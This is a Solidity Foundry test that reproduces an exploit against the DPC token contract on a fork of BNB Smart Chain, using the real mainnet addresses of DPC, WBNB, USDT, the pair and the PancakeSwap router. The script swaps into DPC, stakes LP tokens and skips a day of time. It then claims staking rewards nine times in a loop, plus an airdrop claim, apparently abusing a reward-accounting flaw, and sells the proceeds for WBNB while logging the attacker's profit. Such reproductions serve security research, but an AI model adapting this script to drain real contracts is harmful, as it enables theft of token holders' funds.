pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IPair {
    function approve(address, uint256) external;
    function balanceOf(address) external returns (uint256);
}

interface IDPC {
    function approve(address, uint256) external;
    function balanceOf(address) external returns (uint256);
    function tokenAirdrop(address, address, uint256) external;
    function stakeLp(address, address, uint256) external;
    function claimStakeLp(address, uint256) external;
    function claimDpcAirdrop(address) external;
}

contract ContractTest is Test {
    IDPC DPC = IDPC(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair Pair = IPair(0x79cD24Ed4524373aF6e047556018b1440CF04be3);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_179_209);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);

        DPC.approve(address(Router), ~uint256(0));
        USDT.approve(address(DPC), ~uint256(0));
        USDT.approve(address(Router), ~uint256(0));
        Pair.approve(address(DPC), ~uint256(0));
        WBNB.approve(address(Router), ~uint256(256));

        address(WBNB).call{value: 2 ether}("");
        WBNBToUSDT();
        USDTToDPC();
        DPC.tokenAirdrop(address(this), address(DPC), 100);
        addDPCLiquidity();
        DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));

        cheats.warp(block.timestamp + 24 * 60 * 60); //spend time

        for (uint256 i = 0; i < 9; i++) {
            DPC.claimStakeLp(address(this), 1);
        }
        DPC.claimDpcAirdrop(address(this));
        DPCToWBNB();

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function WBNBToUSDT() public {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    function USDTToDPC() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(DPC);
        Router.swapExactTokensForTokens(USDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp);
    }

    function addDPCLiquidity() public {
        Router.addLiquidity(
            address(USDT),
            address(DPC),
            USDT.balanceOf(address(this)),
            DPC.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function DPCToWBNB() public {
        address[] memory path = new address[](3);
        path[0] = address(DPC);
        path[1] = address(USDT);
        path[2] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DPC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
